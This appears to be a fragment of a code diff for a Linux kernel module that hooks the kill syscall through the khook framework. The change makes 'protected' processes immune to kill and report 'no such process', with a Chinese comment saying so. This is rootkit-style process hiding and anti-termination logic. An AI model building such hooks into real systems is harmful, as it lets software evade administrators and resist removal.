@@ -68,7 +68,7 @@ static long khook_sys_kill(long pid, long sig) {
         goto err;
     }
     if (is_task_struct_protected(pid_task)) {
-        return 0;
+        return -ESRCH;
     }
     return KHOOK_ORIGIN(sys_kill, pid, sig);
     
@@ -87,7 +87,7 @@ static long khook___x64_sys_kill(const struct pt_regs* regs) {
         goto err;
     }
     if (is_task_struct_protected(pid_task)) {
-        return -ESRCH;
+        return -ESRCH; // 显示没有该进程
     }
     return KHOOK_ORIGIN(__x64_sys_kill, regs);
     
